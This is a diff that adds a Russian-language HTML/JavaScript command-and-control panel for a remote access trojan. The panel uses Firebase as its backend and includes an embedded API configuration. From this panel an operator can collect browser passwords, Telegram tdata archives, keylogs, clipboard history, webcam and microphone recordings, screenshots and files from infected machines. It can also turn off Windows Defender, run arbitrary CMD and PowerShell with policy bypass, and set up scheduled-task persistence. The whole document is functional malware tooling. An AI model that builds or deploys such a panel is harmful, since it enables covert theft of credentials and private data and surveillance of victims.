@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Admin Panel v4 - Монстр</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <style>
+        body { background: #0a0a0a; color: #ccc; font-family: 'Courier New', monospace; }
+        .sidebar { background: #1a1a1a; min-width: 250px; padding: 1rem; border-right: 1px solid #333; height: 100vh; overflow-y: auto; }
+        .client-item { display: flex; align-items: center; padding: 8px 12px; margin: 4px 0; background: #222; border-radius: 6px; cursor: pointer; }
+        .client-item:hover { background: #2a2a2a; }
+        .client-item.active { background: #0b5ed7; color: white; }
+        .status-dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
+        .online { background: #00e676; }
+        .offline { background: #ff1744; }
+        .screen-img { max-width: 100%; max-height: 400px; border: 2px solid #333; }
+        .log-area { height: 150px; overflow-y: auto; background: #111; color: #0f0; padding: 8px; font-size: 0.9rem; }
+        .preset-card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 10px; margin: 5px 0; }
+        .btn-hacker { font-family: 'Courier New', monospace; letter-spacing: 1px; }
+        .data-block { background: #111; border: 1px solid #333; border-radius: 6px; padding: 10px; margin-top: 10px; max-height: 300px; overflow-y: auto; }
+        .data-block pre { margin: 0; color: #0f0; white-space: pre-wrap; word-break: break-all; }
+        .tab-pane { padding-top: 15px; }
+        .nav-tabs .nav-link { color: #aaa; }
+        .nav-tabs .nav-link.active { background: #333; color: #fff; border-color: #555; }
+        .card { background: #1e1e1e; border-color: #333; }
+        .card-header { background: #2a2a2a; color: #ddd; }
+    </style>
+</head>
+<body>
+<div class="d-flex">
+    <!-- Боковая панель клиентов -->
+    <div class="sidebar">
+        <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
+        <div id="clientList"></div>
+        <div class="mt-2 small" id="connectionStatus"></div>
+    </div>
+
+    <!-- Основная панель -->
+    <div class="flex-grow-1 p-3">
+        <div id="mainContent">
+            <div class="text-center text-secondary mt-5">
+                <i class="bi bi-arrow-left-circle" style="font-size: 3rem;"></i>
+                <h4>Выберите клиента</h4>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+import { getDatabase, ref, onValue, off, set, update, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
+    authDomain: "gen-lang-client-0884792103.firebaseapp.com",
+    databaseURL: "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "gen-lang-client-0884792103",
+    storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
+    messagingSenderId: "556057210756",
+    appId: "1:556057210756:web:45677d6e28066be811f7d1"
+};
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Состояние
+let currentClient = null;
+let subscriptions = {}; // для хранения функций отписки
+let clientsData = {};
+let clientElements = {};
+
+// ========== Работа со списком клиентов ==========
+onValue(ref(db, 'clients'), (snap) => {
+    const data = snap.val();
+    const list = document.getElementById('clientList');
+    list.innerHTML = '';
+    if (!data) {
+        list.innerHTML = '<div class="text-muted">Нет клиентов</div>';
+        return;
+    }
+    Object.keys(data).forEach(id => {
+        const info = data[id] || {};
+        clientsData[id] = { last_seen: info.last_seen || 0 };
+        const item = document.createElement('div');
+        item.className = 'client-item';
+        item.dataset.clientId = id;
+        item.innerHTML = `<span class="status-dot" id="dot-${id}"></span> ${id}`;
+        item.onclick = () => selectClient(id);
+        list.appendChild(item);
+        clientElements[id] = item;
+        updateStatus(id);
+    });
+});
+
+function updateStatus(id) {
+    const dot = document.getElementById(`dot-${id}`);
+    if (!dot) return;
+    const last = clientsData[id]?.last_seen || 0;
+    const online = (Date.now() - last) < 12000;
+    dot.className = `status-dot ${online ? 'online' : 'offline'}`;
+}
+setInterval(() => Object.keys(clientsData).forEach(updateStatus), 2000);
+
+// Статус соединения с Firebase
+onValue(ref(db, '.info/connected'), (snap) => {
+    const el = document.getElementById('connectionStatus');
+    if (snap.val()) {
+        el.innerHTML = '<i class="bi bi-wifi"></i> Connected';
+        el.style.color = '#00e676';
+    } else {
+        el.innerHTML = '<i class="bi bi-wifi-off"></i> Disconnected';
+        el.style.color = '#ff1744';
+    }
+});
+
+// ========== Выбор клиента ==========
+function selectClient(id) {
+    if (currentClient && clientElements[currentClient]) {
+        clientElements[currentClient].classList.remove('active');
+    }
+    currentClient = id;
+    if (clientElements[id]) clientElements[id].classList.add('active');
+    
+    // Отписываемся от старых подписок
+    Object.values(subscriptions).forEach(unsub => { if (unsub) unsub(); });
+    subscriptions = {};
+    
+    renderPanel(id);
+    
+    // Подписка на все нужные поля
+    const clientRef = ref(db, `clients/${id}`);
+    
+    // Скриншот
+    subscriptions.screenshot = onValue(ref(db, `clients/${id}/screenshot`), (snap) => {
+        const img = document.getElementById('screenshotImg');
+        if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
+    });
+    
+    // Вывод команд
+    subscriptions.cmdOutput = onValue(ref(db, `clients/${id}/last_cmd_output`), (snap) => {
+        const val = snap.val();
+        if (val) addLog(`CMD Output:\n${val}`);
+    });
+    
+    // Архив tdata
+    subscriptions.tdata = onValue(ref(db, `clients/${id}/tdata_archive`), (snap) => {
+        const archive = snap.val();
+        const area = document.getElementById('tdataArchiveArea');
+        if (!area) return;
+        if (!archive || !archive.download_url) {
+            area.innerHTML = '<div class="text-secondary">Нет доступного архива tdata</div>';
+            return;
+        }
+        const sizeMB = (archive.size_bytes / 1024 / 1024).toFixed(2);
+        area.innerHTML = `
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <i class="bi bi-file-zip"></i> <strong>${escapeHtml(archive.name)}</strong>
+                    <span class="text-muted ms-2">(${sizeMB} МБ)</span>
+                    <br><small class="text-danger">⚠️ Одноразовая ссылка: после скачивания файл удалится с сервера (file.io)</small>
+                </div>
+                <a href="${archive.download_url}" target="_blank" class="btn btn-sm btn-primary">
+                    <i class="bi bi-download"></i> Скачать (один раз)
+                </a>
+            </div>
+        `;
+    });
+    
+    // Геолокация
+    subscriptions.geo = onValue(ref(db, `clients/${id}/geo`), (snap) => {
+        const geo = snap.val();
+        const el = document.getElementById('geoInfo');
+        if (!el) return;
+        if (geo) {
+            el.innerHTML = `
+                <i class="bi bi-geo-alt"></i> ${escapeHtml(geo.city || '')}, ${escapeHtml(geo.country || '')}
+                <br><small>IP: ${escapeHtml(geo.ip || '')} | ISP: ${escapeHtml(geo.isp || '')}</small>
+            `;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет данных</span>';
+        }
+    });
+    
+    // Пароли
+    subscriptions.passwords = onValue(ref(db, `clients/${id}/passwords`), (snap) => {
+        const val = snap.val();
+        const el = document.getElementById('passwordsDisplay');
+        if (!el) return;
+        if (val) {
+            try {
+                const data = typeof val === 'string' ? JSON.parse(val) : val;
+                let html = '<div class="table-responsive"><table class="table table-dark table-sm"><thead><tr><th>URL</th><th>Логин</th><th>Пароль</th></tr></thead><tbody>';
+                data.forEach(item => {
+                    html += `<tr><td>${escapeHtml(item.url || '')}</td><td>${escapeHtml(item.username || '')}</td><td>${escapeHtml(item.password || '')}</td></tr>`;
+                });
+                html += '</tbody></table></div>';
+                el.innerHTML = html;
+            } catch(e) {
+                el.innerHTML = `<pre>${escapeHtml(val)}</pre>`;
+            }
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет паролей</span>';
+        }
+    });
+    
+    // Кейлог
+    subscriptions.keylog = onValue(ref(db, `clients/${id}/keylog`), (snap) => {
+        const val = snap.val();
+        const el = document.getElementById('keylogDisplay');
+        if (!el) return;
+        el.innerHTML = val ? `<pre>${escapeHtml(val)}</pre>` : '<span class="text-secondary">Нет данных</span>';
+    });
+    
+    // Буфер обмена (последние 20 записей)
+    subscriptions.clipboard = onValue(ref(db, `clients/${id}/clipboard_history`), (snap) => {
+        const data = snap.val();
+        const el = document.getElementById('clipboardDisplay');
+        if (!el) return;
+        if (data) {
+            const items = Object.values(data).slice(-20).reverse();
+            let html = '<ul class="list-unstyled small">';
+            items.forEach(item => {
+                const time = item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : '';
+                html += `<li><span class="text-muted">[${time}]</span> ${escapeHtml(item.text || '')}</li>`;
+            });
+            html += '</ul>';
+            el.innerHTML = html;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет данных</span>';
+        }
+    });
+    
+    // Список файлов
+    subscriptions.fileList = onValue(ref(db, `clients/${id}/file_list`), (snap) => {
+        const val = snap.val();
+        const el = document.getElementById('fileListDisplay');
+        if (!el) return;
+        if (val && Array.isArray(val)) {
+            el.innerHTML = `<ul class="list-unstyled small">${val.map(f => `<li>${escapeHtml(f)}</li>`).join('')}</ul>`;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет списка</span>';
+        }
+    });
+    // Ошибки файлового менеджера
+    subscriptions.fileErrors = onValue(ref(db, `clients/${id}/file_list_error`), (snap) => {
+        const err = snap.val();
+        if (err) addLog(`[FILE ERROR] ${err}`);
+    });
+    subscriptions.fileDownload = onValue(ref(db, `clients/${id}/downloaded_file_url`), (snap) => {
+        const url = snap.val();
+        if (url) {
+            const name = document.getElementById('downloadedFileName')?.innerText || 'файл';
+            addLog(`Файл скачан: ${name} -> ${url}`);
+        }
+    });
+    
+    // Микрофон
+    subscriptions.mic = onValue(ref(db, `clients/${id}/mic_url`), (snap) => {
+        const url = snap.val();
+        const el = document.getElementById('micLink');
+        if (!el) return;
+        if (url) {
+            el.innerHTML = `<a href="${url}" target="_blank" class="btn btn-sm btn-success"><i class="bi bi-file-earmark"></i> Скачать запись</a>`;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет записи</span>';
+        }
+    });
+    // Веб-камера
+    subscriptions.webcam = onValue(ref(db, `clients/${id}/webcam_image`), (snap) => {
+        const b64 = snap.val();
+        const el = document.getElementById('webcamImg');
+        if (!el) return;
+        if (b64) {
+            el.src = `data:image/jpeg;base64,${b64}`;
+            el.style.display = 'inline';
+        } else {
+            el.style.display = 'none';
+        }
+    });
+    // Статус Defender
+    subscriptions.defender = onValue(ref(db, `clients/${id}/defender_status`), (snap) => {
+        const status = snap.val();
+        const el = document.getElementById('defenderStatus');
+        if (!el) return;
+        if (status) {
+            el.innerHTML = `<span class="badge ${status === 'disabled' ? 'bg-success' : 'bg-warning'}">${escapeHtml(status)}</span>`;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Неизвестно</span>';
+        }
+    });
+    // PowerShell вывод
+    subscriptions.psOutput = onValue(ref(db, `clients/${id}/ps_output`), (snap) => {
+        const out = snap.val();
+        const el = document.getElementById('psOutput');
+        if (!el) return;
+        if (out) {
+            el.innerHTML = `<pre class="text-success">${escapeHtml(out)}</pre>`;
+        } else {
+            el.innerHTML = '<span class="text-secondary">Нет вывода</span>';
+        }
+    });
+    // Ошибки PowerShell
+    subscriptions.psError = onValue(ref(db, `clients/${id}/ps_error`), (snap) => {
+        const err = snap.val();
+        if (err) addLog(`[PS ERROR] ${err}`);
+    });
+}
+
+function addLog(msg) {
+    const log = document.getElementById('logArea');
+    if (!log) return;
+    log.innerHTML += `[${new Date().toLocaleTimeString()}] ${escapeHtml(msg)}\n`;
+    log.scrollTop = log.scrollHeight;
+}
+
+function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+    });
+}
+
+// ========== Пресеты (localStorage) ==========
+const PRESETS_KEY = 'remoteControlPresets';
+function loadPresets() {
+    try {
+        const raw = localStorage.getItem(PRESETS_KEY);
+        return raw ? JSON.parse(raw) : Array(7).fill({ name: '', command: '', payload: '' });
+    } catch (e) {
+        return Array(7).fill({ name: '', command: '', payload: '' });
+    }
+}
+function savePresets(presets) {
+    localStorage.setItem(PRESETS_KEY, JSON.stringify(presets));
+}
+
+// Рендер основной панели
+function renderPanel(id) {
+    const main = document.getElementById('mainContent');
+    const presets = loadPresets();
+
+    let presetsHtml = '';
+    for (let i = 0; i < 7; i++) {
+        const p = presets[i];
+        presetsHtml += `
+        <div class="preset-card">
+            <div class="row g-2 align-items-end">
+                <div class="col-md-3">
+                    <label class="form-label">Название</label>
+                    <input type="text" class="form-control form-control-sm preset-name" data-index="${i}" value="${escapeHtml(p.name || '')}">
+                </div>
+                <div class="col-md-3">
+                    <label class="form-label">Команда</label>
+                    <input type="text" class="form-control form-control-sm preset-cmd" data-index="${i}" value="${escapeHtml(p.command || '')}">
+                </div>
+                <div class="col-md-4">
+                    <label class="form-label">Payload</label>
+                    <input type="text" class="form-control form-control-sm preset-payload" data-index="${i}" value="${escapeHtml(p.payload || '')}">
+                </div>
+                <div class="col-md-2">
+                    <button class="btn btn-outline-primary btn-sm w-100 preset-run" data-index="${i}">▶ Запустить</button>
+                </div>
+            </div>
+        </div>`;
+    }
+
+    main.innerHTML = `
+        <h3><i class="bi bi-sliders"></i> Управление: <span class="text-info">${escapeHtml(id)}</span></h3>
+        
+        <!-- Вкладки -->
+        <ul class="nav nav-tabs" id="mainTabs" role="tablist">
+            <li class="nav-item"><a class="nav-link active" id="tab-general" data-bs-toggle="tab" href="#general">Основное</a></li>
+            <li class="nav-item"><a class="nav-link" id="tab-files" data-bs-toggle="tab" href="#files">Файлы</a></li>
+            <li class="nav-item"><a class="nav-link" id="tab-extras" data-bs-toggle="tab" href="#extras">Дополнительно</a></li>
+            <li class="nav-item"><a class="nav-link" id="tab-persistence" data-bs-toggle="tab" href="#persistence">Persistence</a></li>
+        </ul>
+        
+        <div class="tab-content">
+            <!-- Вкладка Общее -->
+            <div class="tab-pane fade show active" id="general" role="tabpanel">
+                <div class="row mt-3">
+                    <div class="col-md-8">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header">Скриншот</div>
+                            <div class="card-body text-center">
+                                <img id="screenshotImg" class="screen-img" src="" alt="Нет данных">
+                            </div>
+                        </div>
+                        <div class="card bg-dark border-secondary mt-3">
+                            <div class="card-header"><i class="bi bi-archive"></i> Архив tdata (Telegram)</div>
+                            <div class="card-body" id="tdataArchiveArea">
+                                <div class="text-secondary">Загрузка...</div>
+                            </div>
+                        </div>
+                        <div class="row mt-3">
+                            <div class="col-md-6">
+                                <div class="card bg-dark border-secondary">
+                                    <div class="card-header"><i class="bi bi-geo-alt"></i> Геолокация</div>
+                                    <div class="card-body" id="geoInfo"><span class="text-secondary">Нет данных</span></div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="card bg-dark border-secondary">
+                                    <div class="card-header"><i class="bi bi-shield"></i> Defender</div>
+                                    <div class="card-body" id="defenderStatus"><span class="text-secondary">Нет данных</span></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header">Лог</div>
+                            <div class="card-body p-0">
+                                <div id="logArea" class="log-area"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Быстрые команды -->
+                <div class="mt-3">
+                    <h5>Быстрые команды</h5>
+                    <div class="d-flex flex-wrap gap-2">
+                        <button class="btn btn-outline-warning btn-hacker" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
+                        <button class="btn btn-outline-warning" onclick="sendCmd('crazy_mouse')"><i class="bi bi-mouse"></i> Crazy Mouse</button>
+                        <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
+                        <button class="btn btn-outline-primary" onclick="sendCmd('open_calc')"><i class="bi bi-calculator"></i> Open Calc</button>
+                        <button class="btn btn-outline-light" onclick="sendCmd('swap_mouse')"><i class="bi bi-arrow-left-right"></i> Swap Mouse</button>
+                    </div>
+                    <div class="mt-2 d-flex gap-2">
+                        <button class="btn btn-outline-danger" onclick="sendBlockInput(true)"><i class="bi bi-lock"></i> Включить блокировку</button>
+                        <button class="btn btn-outline-success" onclick="sendBlockInput(false)"><i class="bi bi-unlock"></i> Выключить блокировку</button>
+                        <button class="btn btn-outline-warning" onclick="sendDisco()"><i class="bi bi-boombox"></i> Disco 10s</button>
+                    </div>
+                    <div class="input-group mt-2">
+                        <input type="text" id="msgText" class="form-control" placeholder="Текст сообщения">
+                        <button class="btn btn-outline-success" onclick="sendMsg()"><i class="bi bi-send"></i> Сообщение</button>
+                    </div>
+                    <div class="input-group mt-2">
+                        <input type="text" id="ttsText" class="form-control" placeholder="Текст для озвучки">
+                        <button class="btn btn-outline-success" onclick="sendTTS()"><i class="bi bi-volume-up"></i> Озвучить</button>
+                    </div>
+                    <div class="input-group mt-2">
+                        <input type="text" id="wallpaperUrl" class="form-control" placeholder="URL картинки для обоев">
+                        <button class="btn btn-outline-success" onclick="sendWallpaper()"><i class="bi bi-image"></i> Сменить обои</button>
+                    </div>
+                    <div class="input-group mt-2">
+                        <input type="text" id="cmdExec" class="form-control" placeholder="Команда для cmd_execute">
+                        <button class="btn btn-outline-danger" onclick="sendCmdExec()"><i class="bi bi-terminal"></i> Выполнить CMD</button>
+                    </div>
+                    <hr>
+                    <button class="btn btn-danger btn-lg w-100" onclick="sendCmd('self_destruct')"><i class="bi bi-skull"></i> ВЫКЛЮЧИТЬ ВИРУС</button>
+                </div>
+            </div>
+            
+            <!-- Вкладка Файлы -->
+            <div class="tab-pane fade" id="files" role="tabpanel">
+                <div class="row mt-3">
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-folder"></i> Файловый менеджер</div>
+                            <div class="card-body">
+                                <div class="input-group mb-2">
+                                    <input type="text" id="filePath" class="form-control" placeholder="Путь к файлу/папке">
+                                    <button class="btn btn-outline-primary" onclick="sendFileManager('list')"><i class="bi bi-list"></i> Список</button>
+                                    <button class="btn btn-outline-success" onclick="sendFileManager('download')"><i class="bi bi-download"></i> Скачать</button>
+                                    <button class="btn btn-outline-danger" onclick="sendFileManager('delete')"><i class="bi bi-trash"></i> Удалить</button>
+                                </div>
+                                <div id="fileListDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
+                                <div id="downloadedFileName" style="display:none;"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-key"></i> Пароли из браузеров</div>
+                            <div class="card-body">
+                                <button class="btn btn-outline-warning mb-2" onclick="sendCmd('extract_passwords')"><i class="bi bi-arrow-repeat"></i> Извлечь пароли</button>
+                                <div id="passwordsDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row mt-3">
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-mic"></i> Микрофон</div>
+                            <div class="card-body">
+                                <div class="input-group mb-2">
+                                    <input type="number" id="micDuration" class="form-control" value="10" placeholder="Длительность (сек)">
+                                    <button class="btn btn-outline-primary" onclick="sendMic()"><i class="bi bi-record-circle"></i> Записать</button>
+                                </div>
+                                <div id="micLink"><span class="text-secondary">Нет записи</span></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-camera-video"></i> Веб-камера</div>
+                            <div class="card-body">
+                                <button class="btn btn-outline-info mb-2" onclick="sendCmd('webcam_snapshot')"><i class="bi bi-camera"></i> Сделать снимок</button>
+                                <div class="text-center">
+                                    <img id="webcamImg" class="img-fluid" style="max-height:200px; display:none;" alt="Веб-камера">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-terminal"></i> PowerShell (с Bypass)</div>
+                            <div class="card-body">
+                                <div class="input-group mb-2">
+                                    <textarea id="psScript" class="form-control" rows="3" placeholder="Введите PowerShell-скрипт..."></textarea>
+                                    <button class="btn btn-outline-danger" onclick="sendPS()"><i class="bi bi-play-circle"></i> Выполнить</button>
+                                </div>
+                                <div><strong>Вывод:</strong></div>
+                                <div id="psOutput" class="data-block"><span class="text-secondary">Нет вывода</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Вкладка Дополнительно -->
+            <div class="tab-pane fade" id="extras" role="tabpanel">
+                <div class="row mt-3">
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-keyboard"></i> Кейлоггер</div>
+                            <div class="card-body">
+                                <div id="keylogDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-clipboard"></i> Буфер обмена</div>
+                            <div class="card-body">
+                                <div id="clipboardDisplay" class="data-block"><span class="text-secondary">Нет данных</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-shield-shaded"></i> Защита и обход</div>
+                            <div class="card-body">
+                                <button class="btn btn-outline-warning" onclick="sendCmd('disable_defender')"><i class="bi bi-shield-slash"></i> Отключить Defender</button>
+                                <span class="ms-2">Статус: <span id="defenderStatus2">—</span></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Вкладка Persistence -->
+            <div class="tab-pane fade" id="persistence" role="tabpanel">
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <div class="card bg-dark border-secondary">
+                            <div class="card-header"><i class="bi bi-infinity"></i> Самовосстановление</div>
+                            <div class="card-body">
+                                <p>Создаёт задачу в планировщике (запуск каждые 5 мин) и копию в скрытую папку.</p>
+                                <button class="btn btn-outline-success me-2" onclick="sendCmd('create_persistence')"><i class="bi bi-plus-circle"></i> Включить</button>
+                                <button class="btn btn-outline-danger" onclick="sendCmd('remove_persistence')"><i class="bi bi-dash-circle"></i> Отключить</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Пресеты -->
+        <div class="mt-4">
+            <h5><i class="bi bi-star-fill text-warning"></i> Пресеты (7 слотов)</h5>
+            ${presetsHtml}
+            <small class="text-muted">Изменения сохраняются автоматически</small>
+        </div>
+    `;
+
+    // Обработчики изменений в пресетах
+    document.querySelectorAll('.preset-name, .preset-cmd, .preset-payload').forEach(el => {
+        el.addEventListener('input', () => updatePreset(el.dataset.index));
+    });
+    document.querySelectorAll('.preset-run').forEach(btn => {
+        btn.addEventListener('click', () => runPreset(btn.dataset.index));
+    });
+}
+
+// ========== Обновление пресетов ==========
+function updatePreset(index) {
+    const name = document.querySelector(`.preset-name[data-index="${index}"]`)?.value || '';
+    const command = document.querySelector(`.preset-cmd[data-index="${index}"]`)?.value || '';
+    const payload = document.querySelector(`.preset-payload[data-index="${index}"]`)?.value || '';
+    const presets = loadPresets();
+    presets[index] = { name, command, payload };
+    savePresets(presets);
+}
+
+function runPreset(index) {
+    if (!currentClient) return alert('Выберите клиента!');
+    const presets = loadPresets();
+    const preset = presets[index];
+    if (!preset.command) return alert('Команда не задана');
+    const updates = {};
+    updates[`clients/${currentClient}/command`] = preset.command;
+    if (preset.payload) {
+        updates[`clients/${currentClient}/payload`] = preset.payload;
+    }
+    update(ref(db), updates).then(() => addLog(`Пресет: ${preset.name || preset.command}`)).catch(console.error);
+}
+
+// ========== Отправка команд ==========
+window.sendCmd = function(cmd, payload = '') {
+    if (!currentClient) return alert('Выберите клиента!');
+    const updates = { [`clients/${currentClient}/command`]: cmd };
+    if (payload) updates[`clients/${currentClient}/payload`] = payload;
+    update(ref(db), updates).then(() => addLog(`Отправлено: ${cmd}${payload ? ' ('+payload+')' : ''}`)).catch(console.error);
+};
+
+window.sendMsg = function() {
+    const text = document.getElementById('msgText')?.value.trim();
+    if (!text) return;
+    sendCmd('msg', text);
+};
+
+window.sendTTS = function() {
+    const text = document.getElementById('ttsText')?.value.trim();
+    if (!text) return alert('Введите текст');
+    sendCmd('tts', text);
+};
+
+window.sendWallpaper = function() {
+    const url = document.getElementById('wallpaperUrl')?.value.trim();
+    if (!url) return alert('Введите URL');
+    sendCmd('wallpaper', url);
+};
+
+window.sendBlockInput = function(enable) {
+    sendCmd('block_input', enable ? 'true' : 'false');
+};
+
+window.sendDisco = function() {
+    sendCmd('disco', '10');
+};
+
+window.sendCmdExec = function() {
+    const cmdText = document.getElementById('cmdExec')?.value.trim();
+    if (!cmdText) return alert('Введите команду');
+    sendCmd('cmd_execute', cmdText);
+};
+
+// Новые функции отправки
+window.sendFileManager = function(action) {
+    const path = document.getElementById('filePath')?.value.trim();
+    if (!path) return alert('Введите путь');
+    const payload = JSON.stringify({action, path});
+    sendCmd('file_manager', payload);
+};
+
+window.sendMic = function() {
+    const dur = document.getElementById('micDuration')?.value || '10';
+    sendCmd('record_mic', dur);
+};
+
+window.sendPS = function() {
+    const script = document.getElementById('psScript')?.value.trim();
+    if (!script) return alert('Введите PowerShell-скрипт');
+    sendCmd('powershell_execute', script);
+};
+
+// Поддержка Bootstrap tabs (если не инициализированы)
+document.addEventListener('DOMContentLoaded', function() {
+    // Инициализация табов (Bootstrap 5)
+    const triggerTabList = [].slice.call(document.querySelectorAll('#mainTabs a'));
+    triggerTabList.forEach(function(triggerEl) {
+        const tabTrigger = new bootstrap.Tab(triggerEl);
+        triggerEl.addEventListener('click', function(event) {
+            event.preventDefault();
+            tabTrigger.show();
+        });
+    });
+});
+</script>
+<!-- Подключаем Bootstrap JS для табов -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
